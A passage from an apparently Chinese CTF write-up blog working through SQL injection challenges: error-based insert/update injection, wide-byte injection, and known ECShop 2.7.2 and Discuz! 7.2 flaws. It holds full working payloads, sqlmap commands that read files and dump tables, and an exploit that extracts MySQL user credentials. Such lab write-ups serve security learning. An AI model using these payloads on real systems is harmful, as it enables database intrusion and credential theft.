class="line">sqlmap -r test.txt --batch -p user_name --technique B --file-read <span class="string">&quot;/var/www/html/user/updateName.php&quot;</span> --threads <span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include_once</span>(<span class="string">&#x27;../bwvs_config/sys_config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user_name&#x27;</span>])) &#123;</span><br><span class="line">  <span class="comment">#       $clean_username = select_waf1($_POST[&#x27;user_name&#x27;]);</span></span><br><span class="line">  <span class="variable">$clean_username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_name&#x27;</span>];</span><br><span class="line">  <span class="comment">#       $clean_username = XSS_reg($clean_username);</span></span><br><span class="line">  <span class="variable">$clean_user_id</span> = <span class="title function_ invoke__">clear_all</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;u_id&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$clean_user_id</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;Uid_error&#x27;</span>] = <span class="string">&#x27;非法的用户ID&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: edit.php&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;<span class="subst">$clean_username</span>&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$connect</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$data</span>) == <span class="number">1</span>)&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;update_error&#x27;</span>] = <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: edit.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$sql_Up</span> = <span class="string">&quot;UPDATE dwvs_user_message SET DWVS_user_name = &#x27;<span class="subst">$clean_username</span>&#x27; WHERE DWVS_user_id = &#x27;<span class="subst">$clean_user_id</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>,<span class="variable">$sql_Up</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$connect</span>));</span><br><span class="line">      <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$connect</span>);</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_name&#x27;</span>] = <span class="variable">$clean_username</span>;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: edit.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;     </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">not_find</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.4rmfokur1q00.jpg" alt="tumeiimage"></li></ol><h1 id="0x06-SQL报错型注入"><a href="#0x06-SQL报错型注入" class="headerlink" title="0x06 SQL报错型注入"></a>0x06 SQL报错型注入</h1><h2 id="0o00-题目提示-5"><a href="#0o00-题目提示-5" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SQL报错型注入</span><br><span class="line"></span><br><span class="line">需要注册登陆</span><br><span class="line">漏洞一：insert报错注入</span><br><span class="line">漏洞页面：http:<span class="comment">//47.103.94.191:8004/message.php</span></span><br><span class="line">漏洞URL：http:<span class="comment">//47.103.94.191:8004/messageSub.php</span></span><br><span class="line"></span><br><span class="line">漏洞二：update报错注入</span><br><span class="line">漏洞页面：http:<span class="comment">//47.103.94.191:8004/user/edit.php</span></span><br><span class="line">漏洞URL：http:<span class="comment">//47.103.94.191:8004/user/updateName.php</span></span><br><span class="line"></span><br><span class="line">提示：flag在数据库里面</span><br></pre></td></tr></table></figure><h2 id="0o01-漏洞一：insert报错注入"><a href="#0o01-漏洞一：insert报错注入" class="headerlink" title="0o01  漏洞一：insert报错注入"></a>0o01 漏洞一：insert报错注入</h2><ul><li>登录后留言界面留言并抓包，之后去重放那测试。抑或，那请求包去sqlmap那边跑，语句：<code>sqlmap -r test.txt --batch</code> 或 <code>sqlmap -u &quot;http://47.103.94.191:8004/messageSub.php&quot; --batch --cookie &quot;PHPSESSID=4s0hom06cjglakfi64fu9u0h21&quot; --data &quot;message=libai&amp;submit=submit&quot;</code>。</li><li>注：别退出登录（cookie失效）！！！<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/messageSub.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8004</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>27</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.103.94.191:8004</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.103.94.191:8004/message.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=4s0hom06cjglakfi64fu9u0h21</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">message</span>=libai&amp;submit=submit</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 某个位置回显数据--&gt;仅闭合构造</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试字段数</span></span><br><span class="line">message=<span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span><span class="number">3</span><span class="string">&#x27;)#&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 测试回显位置</span></span><br><span class="line"><span class="string">message=1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)#&amp;submit=submit</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代替&#x27;3&#x27;,获取版本</span></span><br><span class="line">message=<span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">2</span><span class="string">&#x27;,@@version,&#x27;</span><span class="number">5</span><span class="string">&#x27;)#&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 报错注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 使用 extractvalue() 方法构造报错注入，得到库名--&gt;dwvs</span></span><br><span class="line"><span class="string">message=222&#x27;</span>or extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>)))#&amp;submit=submit</span><br><span class="line"><span class="comment">// 或使用其他字符使 xml路径 不正确</span></span><br><span class="line">message=<span class="number">222</span><span class="string">&#x27;or extractvalue(1,concat(&#x27;</span><span class="comment">///&#x27;,database())))#&amp;submit=submit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到表名--&gt;flag</span></span><br><span class="line">message=<span class="number">222</span><span class="string">&#x27;or extractvalue(1,concat(&#x27;</span><span class="comment">///&#x27;,(select distinct(table_name) from information_schema.columns where table_schema=database() limit 6,1))))#&amp;submit=submit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到字段名--&gt;flag</span></span><br><span class="line">message=<span class="number">222</span><span class="string">&#x27;or extractvalue(1,concat(&#x27;</span><span class="comment">///&#x27;,(select distinct(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; limit 1,1))))#&amp;submit=submit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到flag--&gt;flag&#123;690997feb8fc9341&#125;</span></span><br><span class="line">message=<span class="number">222</span><span class="string">&#x27;or extractvalue(1,concat(&#x27;</span><span class="comment">///&#x27;,(select distinct(flag) from flag limit 0,1),&#x27;///&#x27;)))#&amp;submit=submit</span></span><br></pre></td></tr></table></figure><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.789r37ciu2o0.jpg" alt="tumeiimage"></li></ul><h2 id="0o02漏洞二：update报错注入"><a href="#0o02漏洞二：update报错注入" class="headerlink" title="0o02漏洞二：update报错注入"></a>0o02漏洞二：update报错注入</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GeometryCollection是由1个或多个任意类几何对象构成的几何对象</span></span><br><span class="line"><span class="comment">// GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）</span></span><br><span class="line"><span class="comment">// 官方举例：GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</span></span><br><span class="line"><span class="comment">// POINT(x,y) 函数--&gt;坐标函数</span></span><br><span class="line"><span class="comment">// LINESTRING(x y,x y)函数--&gt;描述直线，使两点连成直线</span></span><br><span class="line"><span class="comment">// ！！！！使用条件：5.5&lt;mysql版本&lt;5.6</span></span><br><span class="line"><span class="comment">// 注入原理：构造不符合绘制几何图形的参数实现注入，如写入参数为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接拿flag--&gt;flag&#123;f99c688f101bb53fdbf178ad0889182e&#125;</span></span><br><span class="line"><span class="comment">// 注：！！！需要构建2个临时表：a和b，三层select嵌套，暂不懂具体原理(大致是waf造成)。</span></span><br><span class="line">u_id=<span class="number">1</span>&amp;user_name=<span class="number">1</span><span class="string">&#x27;and GeometryCollection((select * from(select * from (select flag from flag)a)b))#  #&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.65jw994dq3o0.jpg" alt="tumeiimage"></p><h1 id="0x07-宽字符注入"><a href="#0x07-宽字符注入" class="headerlink" title="0x07 宽字符注入"></a>0x07 宽字符注入</h1><h2 id="0o00-题目提示-6"><a href="#0o00-题目提示-6" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">宽字符注入</span><br><span class="line"></span><br><span class="line">题目URL：http:<span class="comment">//47.103.94.191:8011</span></span><br><span class="line"></span><br><span class="line">提示：flag在数据库里面.</span><br></pre></td></tr></table></figure><h2 id="0o01-注入流程"><a href="#0o01-注入流程" class="headerlink" title="0o01 注入流程"></a>0o01 注入流程</h2><ul><li>bp手注，具体内容请访问如下URL：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 回显提示：数据库没有id=-81，即不成立，则查找 1=1，为真，即id=1；之后，进行注释闭合</span></span><br><span class="line"><span class="comment">// 回显内容：</span></span><br><span class="line"><span class="comment">// The Query String is : SELECT * FROM users WHERE id=&#x27;-81�\\\&#x27; or 1=1 -- -&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="comment">// hacker 工具利用，构造单引号逃逸</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8011/wide.php?id=-81�\&#x27; or 1=1  -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 猜当前查询语句中查询的字段数--&gt;5</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8011/wide.php?id=1�\&#x27; order by 5  -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用bp工具，注意编码</span></span><br><span class="line">GET /wide.php?id=<span class="number">1</span>%df<span class="string">&#x27;or%201=1%20%23 HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 获取flag--&gt;flag&#123;573ce050c8dcdf3f216bf1485480c1ff&#125;</span></span><br><span class="line"><span class="string">http://47.103.94.191:8011/wide.php?id=-1�\&#x27; union select 1,2,3,flag ,5 from this_flag -- -</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.5mnpfv86h0w0.jpg" alt="tumeiimage"></p><ul><li>sqlmap宽字节注入</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用 sqlmap 的 unmagicquotes.py 脚本构造宽字符注入绕过waf</span></span><br><span class="line"><span class="comment">// 使用说明：用一个多字节组合%bf%27和末尾通用注释一起替换空格</span></span><br><span class="line"><span class="comment">// 转换输出：1&#x27; AND  1=1 ==》 1%bf%27 AND 1=1-- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 unmagicquotes.py 脚本后，可实现注入</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8011/wide.php?id=3&quot;</span> --batch --tamper unmagicquotes</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取flag--&gt;flag&#123;573ce050c8dcdf3f216bf1485480c1ff&#125;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8011/wide.php?id=3&quot;</span> --batch --tamper unmagicquotes -D kzf -T this_flag -C flag --dump</span><br></pre></td></tr></table></figure><h1 id="0x08-宽字符注入02"><a href="#0x08-宽字符注入02" class="headerlink" title="0x08 宽字符注入02"></a>0x08 宽字符注入02</h1><h2 id="0o00-题目提示-7"><a href="#0o00-题目提示-7" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">宽字符注入<span class="number">02</span></span><br><span class="line"></span><br><span class="line">网站URL：http:<span class="comment">//47.103.94.191:8036/</span></span><br><span class="line"></span><br><span class="line">提示：flag在网站数据库里面</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0o01-ecshop-gbk存在宽字符注入"><a href="#0o01-ecshop-gbk存在宽字符注入" class="headerlink" title="0o01 ecshop gbk存在宽字符注入"></a>0o01 ecshop gbk存在宽字符注入</h2><ul><li>首页CMS信息<code>ECSHOP v2.7.2</code></li><li>找找度娘，杂乱无章，跑去跑目录了，不知道是官方还是大佬写的：<code>http://47.103.94.191:8036/readme.txt</code>。</li><li>漏洞信息：<a class="link" target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93503">https://www.seebug.org/vuldb/ssvid-93503<i class="fas fa-external-link-alt"></i></a></li><li>漏洞解析（不肯定）：<a class="link" target="_blank" rel="noopener" href="https://www.2cto.com/Article/201301/182881.html">https://www.2cto.com/Article/201301/182881.html<i class="fas fa-external-link-alt"></i></a></li></ul><h2 id="0o02-注入流程"><a href="#0o02-注入流程" class="headerlink" title="0o02 注入流程"></a>0o02 注入流程</h2><ul><li>这里想测试使用<code>load_file()</code>手工读取文件，奈何……弄不出，有懂得师傅滴滴~</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="comment">// 完整的sql语句：SELECT user_id FROM `ecshop`.`ecs_users` WHERE user_name=&#x27;xxx&#x27; </span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭合</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; and 1=1 -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用updatexml报错注入 --&gt; ecshop</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,database(),0x7e),0) -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找 ecshop 库下表的个数 --&gt; 89</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select count(distinct(table_name)) from information_schema.columns where table_schema=database()),0x7e),0) -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找 ecshop 库中 flag 相关表（bp爆破模块） --&gt; ecs_flag</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select distinct(table_name) from information_schema.columns where table_schema=database() limit 37,1),0x7e),0) -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找 ecs_flag 表中 flag 相关字段 --&gt; id,flag</span></span><br><span class="line"><span class="comment">// 报错：Unknown column &#x27;ecs_flag&#x27; in &#x27;where clause&#x27;</span></span><br><span class="line"><span class="comment">// 16进制编码：ecs_flag --&gt; 0x6563735f666c6167</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select distinct(column_name) from information_schema.columns where table_name=0x6563735f666c6167 limit 1,1),0x7e),0) -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿flag --&gt; flag&#123;e3c801b0662311754ded6f7469</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select flag from ecshop.ecs_flag),0x7e),0) -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// updatexml报错长度限制，substr() 方法进行截断拿后面部分flag --&gt; d6f746903a577&#125;</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select substr(flag,25,30) from ecshop.ecs_flag),0x7e),0) -- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag 组合 --&gt; flag&#123;e3c801b0662311754ded6f746903a577&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 网上流传的exp</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; and 1=1 union select 1 and (select 1 from(select count(*),concat((Select concat(0x5b,user,0x3a,password,0x5d) FROM mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.5444ch7qlm00.jpg" alt="tumeiimage"></p><h1 id="0x09-SQL报错型注入02"><a href="#0x09-SQL报错型注入02" class="headerlink" title="0x09 SQL报错型注入02"></a>0x09 SQL报错型注入02</h1><h2 id="0o00-题目提示-8"><a href="#0o00-题目提示-8" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL报错型注入<span class="number">02</span></span><br><span class="line"></span><br><span class="line">题目URL：http:<span class="comment">//47.103.94.191:8042/</span></span><br></pre></td></tr></table></figure><h2 id="0o01-Discuz-7-2-SQL注入"><a href="#0o01-Discuz-7-2-SQL注入" class="headerlink" title="0o01 Discuz! 7.2 SQL注入"></a>0o01 Discuz! 7.2 SQL注入</h2><ul><li>CMS呀，直接度娘搜，faq.php文件页面存在SQL注入。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP 指令 magic_quotes_gpc 为 on --&gt; 作用类似 addslashes()，即对输入的字符进行转义处理。</span></span><br><span class="line"><span class="comment">// 注：如对输入数据进行 addslashes()处理，则输出时须用 stripslashes()去掉多余的反斜杠。</span></span><br><span class="line"><span class="comment">// addslashes(string) --&gt; 返回在预定义字符之前添加反斜杠的字符串。</span></span><br><span class="line"><span class="comment">// stripslashes(string) --&gt; 删除由 addslashes() 函数添加的反斜杠。</span></span><br></pre></td></tr></table></figure><ul><li>此处不做演示（注：magic_quotes_gpc 自 PHP 5.3 已废弃，自PHP 5.4 已移除。）</li><li>基础理解：在PHP中，若输入为字符串STR，却使用数组方式取值时，则PHP对STR进行单字符拆分，类似C语言的字符串数组。故，在转义后 $sql[0]&#x3D;’&#39;，$sql[1]&#x3D;’单引号’。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.7amb96xk9d0.jpg" alt="tumeiimage"></p><ul><li>深入理解：看大佬解析吧！！！<br>①<a class="link" target="_blank" rel="noopener" href="https://www.t00ls.com/articles-27175.html%EF%BC%88%E5%A4%A7%E8%87%B4%E6%98%AF%E5%8E%9F%E7%89%88%EF%BC%8C%E4%B8%8D%E4%BF%9D%E8%AF%81%EF%BC%89">https://www.t00ls.com/articles-27175.html（大致是原版，不保证）<i class="fas fa-external-link-alt"></i></a><br>②<a class="link" target="_blank" rel="noopener" href="https://www.proyy.com/6995090823914209288.html">https://www.proyy.com/6995090823914209288.html<i class="fas fa-external-link-alt"></i></a><br>③<a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/discuz72-sql-injection.html">https://www.leavesongs.com/discuz72-sql-injection.html<i class="fas fa-external-link-alt"></i></a></li><li>定义数组 <code>$groupids</code>，之后遍历<code>$gids（$_GET[gids]）</code>，先将<code>$gids</code>的每个元素分别赋予<code>$row</code>，然后才是将<code>$row</code>的第一个元素<code>$row[0]</code>取出赋予<code>$groupids[]</code>数组进行存储。</li><li>如下第一个代码块的11句，又调用了<code>implodeids($array)</code>方法，将<code>$groupids</code>数组以<code>,</code>分隔开，组成类似<code>&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;</code>的字符序列。根据前面说的，<code>&#39;</code>被转义称<code>\&#39;</code>，取第一个元素为<code>\</code>，则分隔后内容类似<code>&#39;1&#39;,&#39;2&#39;,&#39;\&#39;,&#39;4&#39;</code>。即<code>\</code>和它之后的<code>&#39;</code>构成转义字符<code>\&#39;</code>，<code>\</code>前的<code>&#39;</code>和<code>4</code>前的<code>&#39;</code>将闭合，其中内容构成新的一个字符串。故此，<code>4</code>后面的单引号逃逸，在<code>4</code>的位置构造注入将获得需要的数据。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">elseif</span>(<span class="variable">$action</span> == <span 